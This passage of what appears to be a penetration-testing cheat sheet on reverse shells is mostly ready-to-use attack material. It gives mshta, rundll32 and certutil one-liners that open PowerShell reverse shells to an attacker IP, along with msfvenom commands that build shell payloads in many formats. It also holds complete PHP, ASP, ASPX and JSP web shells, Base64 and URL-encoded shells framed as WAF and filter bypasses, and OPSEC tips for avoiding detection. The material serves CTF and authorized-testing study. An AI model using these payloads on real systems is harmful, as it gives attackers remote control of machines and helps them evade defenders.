### Windows — Native Executables (No Downloads)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="LOLBins" color="green"}
  :badge{label="No Download" color="orange"}
  :badge{label="Built-in" color="red"}
  :badge{label="Various Detection" color="purple"}
::

When you can't upload tools or use PowerShell, these Windows built-in programs can create reverse connections.

::code-collapse

```powershell [mshta.exe — HTA execution]
:: Attacker: use exploit/windows/misc/hta_server in Metasploit
mshta http://10.10.14.5/payload.hta

:: Inline execution
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c """"$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$y=([text.encoding]::ASCII).GetBytes($t);$s.Write($y,0,$y.Length);$s.Flush()};$c.Close()"""""", 0:close")
```

```powershell [rundll32.exe — JavaScript execution]
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -ep bypass -c $c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length);$s.Flush()};$c.Close()");
```

```powershell [certutil + mshta — Download and execute]
:: Download HTA payload via certutil, execute with mshta
certutil -urlcache -split -f http://10.10.14.5/shell.hta %TEMP%\shell.hta
mshta %TEMP%\shell.hta
```

::

---

## :icon{name="i-lucide-cog"} msfvenom — Payload Generation

### How msfvenom Works

`msfvenom` generates reverse shell payloads in **any format** — executables, scripts, shellcode, and more. It combines payload generation with encoding to create ready-to-deploy payloads.

**Staged vs Stageless:**
- **Staged** (`windows/x64/meterpreter/reverse_tcp`) — small initial payload downloads the full payload from the handler. Requires Metasploit `multi/handler`.
- **Stageless** (`windows/x64/shell_reverse_tcp`) — complete payload in one file. Works with any listener (nc, socat, etc.).

### msfvenom — Linux Payloads

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="msfvenom" color="neutral"}
  :badge{label="Linux" color="green"}
  :badge{label="ELF" color="blue"}
  :badge{label="Staged" color="orange"}
  :badge{label="Stageless" color="red"}
::

```bash [Linux — ELF binaries]
# Stageless reverse shell (works with nc listener)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Staged Meterpreter (requires Metasploit handler)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o meterpreter.elf

# 32-bit
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell32.elf

# Make executable and run on target
chmod +x shell.elf
./shell.elf
```

---

### msfvenom — Windows Payloads

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="msfvenom" color="neutral"}
  :badge{label="Windows" color="blue"}
  :badge{label="EXE" color="green"}
  :badge{label="DLL" color="orange"}
  :badge{label="MSI" color="red"}
::

```bash [Windows — EXE]
# Stageless (works with nc)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Staged Meterpreter (requires handler)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o meterpreter.exe

# 32-bit
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell32.exe
```

```bash [Windows — DLL]
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell.dll

# Execute: rundll32.exe shell.dll,0
```

```bash [Windows — MSI (AlwaysInstallElevated)]
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o shell.msi

# Execute: msiexec /quiet /qn /i shell.msi
```

```bash [Windows — HTA]
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f hta-psh -o shell.hta

# Execute: mshta http://10.10.14.5/shell.hta
```

---

### msfvenom — Web Payloads

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="msfvenom" color="neutral"}
  :badge{label="Web" color="green"}
  :badge{label="PHP" color="blue"}
  :badge{label="ASP" color="orange"}
  :badge{label="JSP" color="red"}
  :badge{label="WAR" color="purple"}
::

```bash [PHP]
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
# Prepend <?php if needed
```

```bash [ASP]
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp
```

```bash [ASPX]
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```

```bash [JSP]
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp
```

```bash [WAR (Tomcat)]
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
# Deploy to Tomcat manager
```

---

### msfvenom — Shellcode

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="msfvenom" color="neutral"}
  :badge{label="Shellcode" color="green"}
  :badge{label="Buffer Overflow" color="blue"}
  :badge{label="Exploit Dev" color="orange"}
::

::code-collapse

```bash [Shellcode — Various formats]
# Python format
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python -o shellcode.py

# C format
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c -o shellcode.c

# Raw binary
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shellcode.bin

# Windows — bad character exclusion (common in BOF)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00\x0a\x0d' -f python

# With encoder
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor_dynamic -f exe -o encoded.exe

# Prepend NOP sled
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00' -f python -n 16
```

::

---

### msfvenom — Quick Reference

| Target | Payload | Listener |
| ------ | ------- | -------- |
| Linux x64 ELF | `linux/x64/shell_reverse_tcp` | nc / socat |
| Linux Meterpreter | `linux/x64/meterpreter/reverse_tcp` | multi/handler |
| Windows x64 EXE | `windows/x64/shell_reverse_tcp` | nc / socat |
| Windows Meterpreter | `windows/x64/meterpreter/reverse_tcp` | multi/handler |
| PHP | `php/reverse_php` | nc |
| ASP | `windows/shell_reverse_tcp -f asp` | nc |
| ASPX | `windows/x64/shell_reverse_tcp -f aspx` | nc |
| JSP / WAR | `java/jsp_shell_reverse_tcp` | nc |
| Python | `python/shell_reverse_tcp` | nc |
| Windows DLL | `windows/x64/shell_reverse_tcp -f dll` | nc |
| Windows MSI | `windows/x64/shell_reverse_tcp -f msi` | nc |

---

## :icon{name="i-lucide-globe"} Web Shells

### PHP Web Shells

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Web Shell" color="neutral"}
  :badge{label="PHP" color="green"}
  :badge{label="File Upload" color="blue"}
  :badge{label="Backdoor" color="orange"}
  :badge{label="Command Execution" color="red"}
::

![PHP Web Shell](https://img.shields.io/badge/PHP_Web_Shell-777BB4?style=for-the-badge&logo=php&logoColor=white)

Web shells are server-side scripts that provide **command execution through a web browser**. They're used when you can upload files but can't get a direct reverse shell, or as a fallback access method. Upload via file upload vulnerabilities, LFI, or write access.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Simple Shells"}
  ```php [Tiny — One parameter]
  <?php system($_GET['cmd']); ?>
  ```

  ```php [Alternative functions]
  <?php echo shell_exec($_GET['cmd']); ?>
  <?php echo exec($_GET['cmd']); ?>
  <?php echo passthru($_GET['cmd']); ?>
  <?php echo `$_GET['cmd']`; ?>
  ```

  ```php [POST parameter (harder to log)]
  <?php system($_POST['cmd']); ?>
  ```

  ```php [Stealthy — Hidden in image comment]
  <?php /* GIF89a */ system($_GET['cmd']); ?>
  ```

  ```bash [Usage]
  # GET request
  curl "http://target.com/shell.php?cmd=id"
  curl "http://target.com/shell.php?cmd=whoami"
  curl "http://target.com/shell.php?cmd=cat+/etc/passwd"

  # URL-encoded reverse shell via web shell
  curl "http://target.com/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'"

  # POST request
  curl -X POST "http://target.com/shell.php" -d "cmd=id"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Feature-Rich Shells"}
  ```php [p0wny-shell — Interactive terminal]
  <?php
  // Upload p0wny-shell from GitHub for a full browser-based terminal
  // https://github.com/flozz/p0wny-shell
  ?>
  ```

  ```php [File manager + command exec]
  <?php
  if(isset($_GET['cmd'])){
      echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
  }
  if(isset($_FILES['file'])){
      move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
      echo "Uploaded: " . $_FILES['file']['name'];
  }
  ?>
  <form method="GET"><input name="cmd" size="50"><input type="submit" value="Exec"></form>
  <form method="POST" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" value="Upload"></form>
  ```
  :::
::

::card-group
  ::card
  ---
  title: p0wny-shell
  icon: i-simple-icons-github
  to: https://github.com/flozz/p0wny-shell
  target: _blank
  ---
  Single-file PHP web shell with terminal interface — clean, minimal, effective.
  ::

  ::card
  ---
  title: PentestMonkey PHP Shell
  icon: i-simple-icons-github
  to: https://github.com/pentestmonkey/php-reverse-shell
  target: _blank
  ---
  Classic full-featured PHP reverse shell — the most widely used PHP shell.
  ::
::

---

### ASP / ASPX / JSP Web Shells

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Web Shell" color="neutral"}
  :badge{label="ASP" color="green"}
  :badge{label="ASPX" color="blue"}
  :badge{label="JSP" color="orange"}
  :badge{label="IIS / Tomcat" color="red"}
::

::code-collapse

```asp [ASP — Classic]
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("cmd")
szTempFile = "C:\" & oFileSys.GetTempName()
Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile(szTempFile, 1)
Response.Write "<pre>" & oFile.ReadAll & "</pre>"
oFile.Close
oFileSys.DeleteFile szTempFile
%>
<form method="POST"><input name="cmd" size="50"><input type="submit" value="Run"></form>
```

```aspx [ASPX]
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    if (Request["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

```jsp [JSP]
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String dirone = dis.readLine();
    while (dirone != null) {
        out.println(dirone);
        dirone = dis.readLine();
    }
}
%>
<form method="GET"><input name="cmd" size="50"><input type="submit" value="Run"></form>
```

::

---

## :icon{name="i-lucide-arrow-up"} Shell Stabilization & Upgrading

### Why Stabilize?

Raw reverse shells have major limitations:
- No tab completion
- Arrow keys produce `^[[A` escape sequences
- `Ctrl+C` kills the shell (not the command)
- No job control (`bg`, `fg`)
- Can't run interactive programs (`vim`, `nano`, `top`, `su`, `ssh`)
- No proper terminal size (output wraps incorrectly)

**Stabilization** turns a dumb shell into a **fully interactive TTY** with all these features.

### Method 1 — Python PTY (Most Common)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Stabilize" color="neutral"}
  :badge{label="Python" color="green"}
  :badge{label="PTY" color="blue"}
  :badge{label="Most Common" color="orange"}
  :badge{label="Recommended" color="red"}
::

This is the **standard stabilization method** used in nearly every engagement and CTF.

```bash [Step 1 — Spawn PTY on target]
# Try Python 3 first, fall back to Python 2
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# Or with script command (if no Python)
script /dev/null -c bash
script -qc /bin/bash /dev/null
```

```bash [Step 2 — Background the shell]
# Press Ctrl+Z to suspend/background the reverse shell
# You're now back on your attacker machine
^Z
```

```bash [Step 3 — Configure attacker terminal]
# On your attacker machine:
stty raw -echo; fg

# This does two things:
# stty raw -echo → puts terminal in raw mode (passes Ctrl+C, arrow keys to target)
# fg → brings the reverse shell back to foreground
```

```bash [Step 4 — Set terminal environment on target]
# Now you're back in the target shell — set environment variables
export TERM=xterm-256color
export SHELL=/bin/bash

# Set correct terminal size (check your attacker terminal size first)
# On attacker (in another terminal): stty size → e.g., "50 200"
stty rows 50 columns 200
```

::tip
**If your shell breaks** after running `stty raw -echo; fg`, type `reset` blindly and press Enter. You won't see what you're typing, but it will restore the terminal.
::

---

### Method 2 — rlwrap (Attacker Side)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Stabilize" color="neutral"}
  :badge{label="rlwrap" color="green"}
  :badge{label="Quick" color="blue"}
  :badge{label="Arrow Keys" color="orange"}
::

The simplest method — wrap your listener with `rlwrap` for arrow key history and line editing. This doesn't provide a full TTY but solves the most annoying issues.

```bash [rlwrap — Start listener with it]
rlwrap nc -lvnp 4444

# That's it — arrow keys and history work immediately
# Combine with Python PTY for best results
```

---

### Method 3 — Socat Full TTY

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Stabilize" color="neutral"}
  :badge{label="Socat" color="green"}
  :badge{label="Full TTY" color="blue"}
  :badge{label="Best Quality" color="orange"}
  :badge{label="Requires Upload" color="red"}
::

Socat provides the **best possible shell quality** — full interactive TTY with job control, tab completion, and proper signal handling. The downside is socat must be present on the target.

```bash [Attacker — Socat TTY listener]
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

```bash [Target — Socat TTY payload]
# If socat is installed:
socat TCP:10.10.14.5:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

# If not installed, upload static binary:
wget -q http://10.10.14.5/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat TCP:10.10.14.5:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

---

### Method 4 — script Command

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Stabilize" color="neutral"}
  :badge{label="script" color="green"}
  :badge{label="No Python" color="blue"}
  :badge{label="Built-in" color="orange"}
::

When Python is not available, the `script` command (present on most Unix systems) can create a PTY.

```bash [script — PTY without Python]
# Method 1
script /dev/null -c bash

# Method 2
script -qc /bin/bash /dev/null

# Then continue with Ctrl+Z, stty raw -echo; fg, export TERM=xterm
```

---

### Method 5 — Windows Shell Upgrade

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Stabilize" color="neutral"}
  :badge{label="Windows" color="blue"}
  :badge{label="ConPty" color="green"}
  :badge{label="Full Interactive" color="orange"}
::

Windows shells are harder to stabilize. **ConPtyShell** is the best solution for a fully interactive Windows reverse shell.

```powershell [ConPtyShell — Full Windows TTY]
:: Attacker — special listener:
stty raw -echo; (stty size; cat) | nc -lvnp 4444

:: Target — download and execute:
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-ConPtyShell.ps1')
Invoke-ConPtyShell 10.10.14.5 4444
```

```powershell [rlwrap — Simpler Windows approach]
:: Attacker:
rlwrap nc -lvnp 4444

:: At least gives arrow key support for Windows cmd/powershell
```

---

### Stabilization Quick Reference

::steps{level="4"}

#### Fast Method (30 seconds)

```bash
# Listener: rlwrap nc -lvnp 4444
# On target: python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
# stty raw -echo; fg
# export TERM=xterm
```

#### Full Method (1 minute)

```bash
# Listener: rlwrap nc -lvnp 4444
# On target: python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
# stty raw -echo; fg
# export TERM=xterm-256color
# export SHELL=/bin/bash
# export HOME=/home/user
# stty rows 50 columns 200
```

#### Best Quality (requires socat)

```bash
# Listener: socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
# On target: socat TCP:10.10.14.5:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

#### If Shell Breaks

```bash
# Type blindly:
reset
# Press Enter
# If that doesn't work:
stty sane
# Press Enter
```

::

---

## :icon{name="i-lucide-shield"} Encoded & Obfuscated Shells

### Base64 Encoded Payloads

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Encoding" color="neutral"}
  :badge{label="Base64" color="green"}
  :badge{label="WAF Bypass" color="blue"}
  :badge{label="Special Characters" color="orange"}
  :badge{label="Filter Evasion" color="red"}
::

Base64 encoding bypasses **input filters**, **WAF rules**, and **special character restrictions** that would break raw shell payloads. Common when exploiting command injection through web applications.

```bash [Bash — Base64 encoded]
# Generate on attacker:
echo -n 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==

# Execute on target:
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ== | base64 -d | bash
```

```bash [Bash — Base64 one-liner format]
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}'
```

```bash [Python — Base64 encoded]
# Generate:
echo -n "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.14.5',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" | base64

# Execute:
python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IH...').decode())"
```

```powershell [PowerShell — Base64 encoded]
:: Generate on attacker (Linux):
echo -n '$c=New-Object Net.Sockets.TCPClient("10.10.14.5",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length);$s.Flush()};$c.Close()' | iconv -t UTF-16LE | base64 -w0

:: Execute on target:
powershell -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgA...
```

---

### URL Encoded Payloads

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Encoding" color="neutral"}
  :badge{label="URL Encoding" color="green"}
  :badge{label="Web Injection" color="blue"}
  :badge{label="HTTP Requests" color="orange"}
::

URL encoding is essential when injecting reverse shell payloads through **URL parameters**, **GET requests**, or **web forms**.

```bash [URL encoded bash reverse shell]
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F4444%200%3E%261%27
```

```bash [Double URL encoded (WAF bypass)]
%2562%2561%2573%2568%2520%252d%2563%2520%2527%2562%2561%2573%2568%2520%252d%2569%2520%253e%2526%2520%252f%2564%2565%2576%252f%2574%2563%2570%252f%2531%2530%252e%2531%2530%252e%2531%2534%252e%2535%252f%2534%2534%2534%2534%2520%2530%253e%2526%2531%2527
```

```bash [URL encoded in curl command]
curl "http://target.com/vuln.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'"
```

---

## :icon{name="i-lucide-globe"} Online Generators

### RevShells.com

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Generator" color="neutral"}
  :badge{label="Online" color="green"}
  :badge{label="All Languages" color="blue"}
  :badge{label="Encoding" color="orange"}
  :badge{label="Listener Commands" color="red"}
  :badge{label="Best Tool" color="purple"}
::

![RevShells](https://img.shields.io/badge/RevShells.com-000000?style=for-the-badge&logo=gnubash&logoColor=white)

**RevShells.com** is the **most useful online reverse shell generator**. Enter your IP and port, select the language/type, and it generates ready-to-copy payloads with the matching listener command.

Features:
- **30+ shell types** — Bash, Python, PHP, PowerShell, Java, C#, and more
- **Encoding options** — Base64, URL encoding, double encoding
- **Listener commands** — auto-generates the matching attacker listener
- **Operating system toggle** — Linux / Windows targets
- **Copy to clipboard** — one-click copy

::card-group
  ::card
  ---
  title: RevShells.com
  icon: i-lucide-globe
  to: https://www.revshells.com/
  target: _blank
  ---
  Interactive reverse shell generator — select language, encoding, and copy payloads instantly.
  ::

  ::card
  ---
  title: RevShells — GitHub
  icon: i-simple-icons-github
  to: https://github.com/0dayCTF/reverse-shell-generator
  target: _blank
  ---
  Source code for RevShells.com — can be self-hosted for offline use.
  ::
::

---

## :icon{name="i-lucide-search"} Shell Discovery & Troubleshooting

### Check Available Tools on Target

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Discovery" color="neutral"}
  :badge{label="Tool Check" color="green"}
  :badge{label="Troubleshoot" color="blue"}
::

Before attempting a reverse shell, check which tools are available on the target:

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux"}
  ```bash [Check available tools]
  which bash sh nc ncat socat python python3 perl ruby php lua node curl wget 2>/dev/null
  ```

  ```bash [Check shell]
  echo $0
  echo $SHELL
  cat /etc/shells
  ```

  ```bash [Test outbound connectivity]
  # Check if target can reach attacker
  curl http://10.10.14.5/test
  wget http://10.10.14.5/test
  nc -zv 10.10.14.5 4444
  ping -c 1 10.10.14.5
  bash -c 'echo test > /dev/tcp/10.10.14.5/4444'
  ```
  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows"}
  ```powershell [Check tools]
  where powershell cmd nc ncat curl certutil 2>nul
  Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
  ```

  ```powershell [Test connectivity]
  Test-NetConnection 10.10.14.5 -Port 4444
  powershell -c "(New-Object Net.Sockets.TCPClient('10.10.14.5',4444)).Connected"
  ```
  :::
::

---

### Troubleshooting Common Issues

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Troubleshoot" color="neutral"}
  :badge{label="Common Issues" color="green"}
  :badge{label="Fixes" color="blue"}
::

| Problem | Cause | Solution |
| ------- | ----- | -------- |
| No connection received | Firewall blocking outbound | Try ports 80, 443, 53 |
| Shell dies immediately | Bad characters in payload | URL/Base64 encode the payload |
| `^[[A` when pressing arrows | Unstabilized shell | Run Python PTY + stty |
| `Ctrl+C` kills shell | Raw terminal not set | `stty raw -echo; fg` |
| Shell hangs after connect | Payload syntax error | Test with simple `id` command first |
| `/dev/tcp` not found | Shell is `sh` not `bash` | Use `bash -c '...'` explicitly |
| PowerShell blocked | Execution policy / AMSI | Use `-ep bypass` or `cmd.exe` |
| Can't run `su` or `ssh` | No TTY allocated | Spawn PTY with Python or script |

---

## :icon{name="i-lucide-list-checks"} Reverse Shell Selection Guide

Choose the right payload based on what's available on the target:

| Available Tool | Best Payload | Shell Quality |
| -------------- | ------------ | ------------- |
| `bash` | `bash -i >& /dev/tcp/...` | :badge{label="Good" color="green"} |
| `python3` | Python socket + pty | :badge{label="Good" color="green"} |
| `python` | Python 2 socket | :badge{label="Good" color="green"} |
| `nc` (traditional) | `nc -e /bin/bash` | :badge{label="OK" color="orange"} |
| `nc` (OpenBSD) | mkfifo pipe method | :badge{label="OK" color="orange"} |
| `socat` | Socat full TTY | :badge{label="Best" color="green"} |
| `php` | PHP fsockopen | :badge{label="OK" color="orange"} |
| `perl` | Perl socket | :badge{label="OK" color="orange"} |
| `ruby` | Ruby TCPSocket | :badge{label="OK" color="orange"} |
| `powershell` | PS TCPClient | :badge{label="Good" color="green"} |
| Nothing | Upload `nc`/`socat` or use `/dev/tcp` | :badge{label="Varies" color="orange"} |

---

## :icon{name="i-lucide-shield-alert"} Detection & OPSEC

::card-group
  ::card
  ---
  title: High Detection Risk
  icon: i-lucide-shield-alert
  color: red
  ---
  PowerShell `IEX`, `DownloadString`, `mshta`, `rundll32` with URLs, unencoded payloads in URL parameters. Flagged by AMSI, Defender, and most EDR solutions.
  ::

  ::card
  ---
  title: Medium Detection Risk
  icon: i-lucide-shield
  color: orange
  ---
  Base64-encoded PowerShell, `nc -e`, PHP `system()` calls, Python one-liners. Logged but may not trigger immediate alerts.
  ::

  ::card
  ---
  title: Lower Detection Risk
  icon: i-lucide-shield-check
  color: green
  ---
  Socat/Ncat with SSL, encrypted payloads, custom compiled shells, Bash `/dev/tcp`, shells using common ports (443/80).
  ::

  ::card
  ---
  title: OPSEC Tips
  icon: i-lucide-eye-off
  color: blue
  ---
  Use SSL-encrypted shells (ncat/socat). Prefer port 443 over random ports. Clean up shell artifacts. Avoid PowerShell `IEX` when possible. Use staged payloads to reduce on-disk footprint.
  ::
::

---

## :icon{name="i-lucide-book-open"} References

::card-group
  ::card
  ---
  title: RevShells.com
  icon: i-lucide-globe
  to: https://www.revshells.com/
  target: _blank
  ---
  The best online reverse shell generator — 30+ payload types with encoding options.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — Reverse Shell
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
  target: _blank
  ---
  Comprehensive reverse shell cheatsheet with every language and technique.
  ::

  ::card
  ---
  title: PentestMonkey — Reverse Shell Cheatsheet
  icon: i-lucide-book-open
  to: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  target: _blank
  ---
  The original reverse shell cheatsheet — classic reference.
  ::

  ::card
  ---
  title: HackTricks — Shells
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/index.html
  target: _blank
  ---
  HackTricks reverse shell reference with Linux and Windows payloads.
  ::

  ::card
  ---
  title: Nishang
  icon: i-simple-icons-github
  to: https://github.com/samratashok/nishang
  target: _blank
  ---
  9K+ ⭐ — Offensive PowerShell framework with Invoke-PowerShellTcp and more.
  ::

  ::card
  ---
  title: ConPtyShell
  icon: i-simple-icons-github
  to: https://github.com/antonioCoco/ConPtyShell
  target: _blank
  ---
  Fully interactive reverse shell for Windows — the best Windows shell experience.
  ::

  ::card
  ---
  title: pwncat-cs
  icon: i-simple-icons-github
  to: https://github.com/calebstewart/pwncat
  target: _blank
  ---
  2.5K+ ⭐ — Post-exploitation platform with automatic shell stabilization.
  ::

  ::card
  ---
  title: webshell Collection
  icon: i-simple-icons-github
  to: https://github.com/tennc/webshell
  target: _blank
  ---
  10K+ ⭐ — Massive collection of web shells in PHP, ASP, ASPX, JSP, and more.
  ::
::